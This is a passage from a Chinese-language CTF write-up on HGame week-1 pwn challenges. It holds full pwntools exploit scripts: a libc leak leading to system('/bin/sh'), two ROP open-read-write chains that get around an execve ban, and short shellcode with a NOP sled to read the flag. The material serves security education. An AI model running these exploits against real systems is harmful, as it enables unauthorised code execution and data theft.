= {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;week-1.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... sendline_after_clean(b\u0026#34;-6\u0026#34;, \u0026#34;please choose one.\\n\u0026#34;) send_after_clean(pg(0x4011D6)) sendline_after_clean(b\u0026#34;-9\u0026#34;, \u0026#34;please choose one.\\n\u0026#34;) send_after_clean(b\u0026#34;1\u0026#34;*7+b\u0026#34;.\u0026#34;, \u0026#34;please input your name\\n\u0026#34;) puts_addr = recv_and_transform(b\u0026#34;.\u0026#34;) base_addr = puts_addr - libc.sym[\u0026#39;puts\u0026#39;] system_addr = base_addr + libc.sym[\u0026#39;system\u0026#39;] one_gadget = base_addr + 0xe3afe suclog( base_addr=base_addr ) sendline_after_clean(b\u0026#34;-9\u0026#34;, \u0026#34;please choose one.\\n\u0026#34;) send_after_clean(b\u0026#34;/bin/sh\\x00\u0026#34; + pg(system_addr), \u0026#34;please input your name\\n\u0026#34;) interactive_after_clean() orw checksec ida 程序禁掉了execve和execveat：\n因为偏移量是0x108，能输入0x130个字符，所以只能执行五条指令：\n法一：ret2libc后栈迁移 因为原来的空间不够，我们可以考虑栈迁移到bss_end + 0x100的地方，然后就可以随便orw了\n# 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes pss: bool = False fn: str = \u0026#34;./HGame-orw\u0026#34; libc_name:str = \u0026#34;./libc-2.31.so\u0026#34; port: str = \u0026#34;30527\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;week-1.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break vuln c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... # 查找gadget的内置函数 rop_gadget = ROP(m_elf) pop_rdi_ret: int = rop_gadget.find_gadget([\u0026#34;pop rdi\u0026#34;, \u0026#34;ret\u0026#34;])[0] ret: int = rop_gadget.find_gadget([\u0026#34;ret\u0026#34;])[0] suclog( pop_rdi_ret=pop_rdi_ret, ret=ret ) #需要自行设定offset offset:int = 0x108 # 需要改为需要的输入函数，默认为puts puts_plt: int = m_elf.plt[\u0026#34;puts\u0026#34;] puts_got: int = m_elf.got[\u0026#34;puts\u0026#34;] vuln_addr: int = m_elf.sym[\u0026#34;vuln\u0026#34;] suclog( puts_plt=puts_plt, puts_got=puts_got, vuln_addr=vuln_addr ) # 发送payload payload = flat({offset:[ pop_rdi_ret, puts_got, puts_plt, vuln_addr ]}) sendline_after_clean(payload) # 得到真实地址 puts_addr:int = recv_and_transform() # 计算得到基址和system地址 base_addr: int = puts_addr - libc.sym[\u0026#39;puts\u0026#39;] system_addr: int = base_addr + libc.sym[\u0026#39;system\u0026#39;] open_addr: int = base_addr + libc.sym[\u0026#39;open\u0026#39;] read_addr: int = base_addr + libc.sym[\u0026#39;read\u0026#39;] # puts_addr: int = base_addr + libc.sym[\u0026#39;puts\u0026#39;] pop_rdi: int = base_addr + 0x0000000000023b6a pop_rsi: int = base_addr + 0x2601f pop_rdx: int = base_addr + 0x142c92 fake_stack = 0x404060 + 0x200 flag = fake_stack flag_content = 0x404060 + 0x300 leave_ret = 0x00000000004012be suclog( puts_addr=puts_addr, base_addr=base_addr, system_addr=system_addr, open_addr=open_addr, read_addr=read_addr, pop_rdi=pop_rdi, pop_rsi=pop_rsi, pop_rdx=pop_rdx, ) # 注意栈对齐 payload = flat({offset-8:[ fake_stack, pop_rsi, fake_stack, read_addr, leave_ret ]}) sendline_after_clean(payload) payload = flat([ \u0026#34;./flag\\x00\\x00\u0026#34;, pop_rdi, flag, pop_rsi, 0, open_addr, pop_rdi, 3, pop_rsi, flag_content, pop_rdx, 0xff, read_addr, pop_rdi, flag_content, puts_addr, ]) sendline_after_clean(payload) interactive_after_clean() 法二：ret2libc后更改rdx重新read 我们在ret2libc后可以考虑更改rdx再返回到vuln+0x1E处：\n然后就能栈溢出任意长字节了\n然后我们再用read把\u0026quot;flag\u0026quot;读入一个可写的地址处，这样我们就能orw得到flag了\n# 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes pss: bool = False fn: str = \u0026#34;./HGame-orw\u0026#34; libc_name:str = \u0026#34;./libc-2.31.so\u0026#34; port: str = \u0026#34;30527\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;week-1.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break vuln c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... # 查找gadget的内置函数 rop_gadget = ROP(m_elf) pop_rdi_ret: int = rop_gadget.find_gadget([\u0026#34;pop rdi\u0026#34;, \u0026#34;ret\u0026#34;])[0] ret: int = rop_gadget.find_gadget([\u0026#34;ret\u0026#34;])[0] suclog( pop_rdi_ret=pop_rdi_ret, ret=ret ) #需要自行设定offset offset:int = 0x108 # 需要改为需要的输入函数，默认为puts puts_plt: int = m_elf.plt[\u0026#34;puts\u0026#34;] puts_got: int = m_elf.got[\u0026#34;puts\u0026#34;] vuln_addr: int = m_elf.sym[\u0026#34;vuln\u0026#34;] suclog( puts_plt=puts_plt, puts_got=puts_got, vuln_addr=vuln_addr ) # 发送payload payload = flat({offset:[ pop_rdi_ret, puts_got, puts_plt, vuln_addr ]}) sendline_after_clean(payload) # 得到真实地址 puts_addr:int = recv_and_transform() # 计算得到基址和system地址 base_addr: int = puts_addr - libc.sym[\u0026#39;puts\u0026#39;] system_addr: int = base_addr + libc.sym[\u0026#39;system\u0026#39;] open_addr: int = base_addr + libc.sym[\u0026#39;open\u0026#39;] read_addr: int = base_addr + libc.sym[\u0026#39;read\u0026#39;] # puts_addr: int = base_addr + libc.sym[\u0026#39;puts\u0026#39;] pop_rdi: int = base_addr + 0x0000000000023b6a pop_rsi: int = base_addr + 0x2601f pop_rdx: int = base_addr + 0x142c92 fake_stack = 0x404060 + 0x200 flag = fake_stack flag_content = 0x404060 + 0x300 leave_ret = 0x00000000004012be suclog( puts_addr=puts_addr, base_addr=base_addr, system_addr=system_addr, open_addr=open_addr, read_addr=read_addr, pop_rdi=pop_rdi, pop_rsi=pop_rsi, pop_rdx=pop_rdx, ) payload = flat({offset:[ pop_rdx, 0xffff, vuln_addr+0x1E ]}) sendline_after_clean(payload) payload = flat({offset:[ pop_rdi, 0, pop_rsi, flag, pop_rdx, 0xff, read_addr, pop_rdi, flag, pop_rsi, 0, pop_rdx, 0, open_addr, pop_rdi, 3, pop_rsi, flag_content, pop_rdx, 0xff, read_addr, pop_rdi, flag_content, puts_addr, ]}) sendline_after_clean(payload) sendline_after_clean(b\u0026#34;./flag\\x00\\x00\u0026#34;) interactive_after_clean() simple_shellcode checksec ida 程序允许我们输入一个0x10字节长的shellcode并执行，同时禁掉了execve和execveat，然而一般的orw shellcode是不可能只有这么短的，所以我们必须从程序的上下文发现漏洞所在\n法一：利用call的特性 我们可以利用call的特性，call会把下一条指令的地址push进栈中，因此我们可以利用栈中的数据跳转到main函数的任意位置\n我们跳转到这里，就可以read进0xcafe0000个字节：\n然后我们就可以输入orw的shellcode进行读写了：\n# 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./HGame-simple_shellcode\u0026#34; libc_name: str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;30295\u0026#34; if_32: bool = False if_debug: bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;week-1.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* $rebase(0x13BB) c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout: int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True, is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... payload = flat([ asm(\u0026#39;\u0026#39;\u0026#39; mov rsi, rdx sub qword ptr [rsp], 36 ret \u0026#39;\u0026#39;\u0026#39;) ]) sendline_after_clean(payload) # 生成orw的shellcode payload = flat([ asm(shellcraft.cat(\u0026#34;./flag\u0026#34;)) ]) sendline_after_clean(payload) interactive_after_clean() 法二：直接syscall调用read覆盖指令 根据调用0xcafe0000前寄存器的状态：\n我们可以使用以下shellcode调用read：\nxchg edx, esi xchg r14d, edi xchg r11d, edx syscall xchg 指令是 x86 汇编语言中的一条指令，它用于交换两个数据的值。它的语法一般是 xchg dest, src，表示将 src 和 dest 中的值交换。这两个参数可以是寄存器或内存地址。 例如，如果寄存器 eax 中存储着数值 4，寄存器 ebx 中存储着数值 5，那么执行 xchg eax, ebx 后，eax 将存储 5，ebx 将存储 4。 xchg 指令通常用于交换两个值，并且它不需要额外的寄存器，因此在多处理器环境中，xchg 指令也可以用来实现互斥锁 需要注意的是，xchg指令是原子的，即在其完成前不会被中断。这是因为 XCHG 指令的实现是通过硬件交换两个数据而不是通过读取和写入实现的，这意味着在这个指令完成之前不能被任何其他指令打断。\n或者使用：\nmov esi, edx xor edi, edi syscall 在 x86 汇编语言中，mov esi, edx 和 mov rsi, rdx 都是用来将寄存器 edx 的值赋给寄存器 esi (rsi)的指令。但这两条指令的二进制长度是不同的。 mov esi, edx 这条指令使用的是 32 位寄存器，它对应的二进制长度为 2 字节；而mov rsi, rdx 使用的是64位寄存器，二进制长度为3字节. 一般来说使用32位寄存器，shellcode会更短\n然后使用nop滑板划到orw的shellcode：\npayload = flat([ asm(\u0026#34;nop\u0026#34;)*0x10, asm(shellcraft.cat(\u0026#34;./flag\u0026#34;)) ]) nop 指令是 x86 汇编语言中的一条指令，它代表 \u0026ldquo;no operation\u0026rdquo;，即不执行任何操作。在二进制中，它对应的是 0x90。 这个指令用于调整指令流程，如在程序执行前或执行后插入 NOP 指令来调整程序中的偏差。也可用于占位用，例如将指令按照预期的顺序分布。 在高级编程中，NOP指令也可能被用来作为指令重定位的起始位置或终止位置，研究和分析程序的指令流程。\n完整exp：\n# 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes pss: bool = False fn: str = \u0026#34;./HGame-simple_shellcode\u0026#34; libc_name: str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;30295\u0026#34; if_32: bool = False if_debug: bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;week-1.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* $rebase(0x13BB) c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if 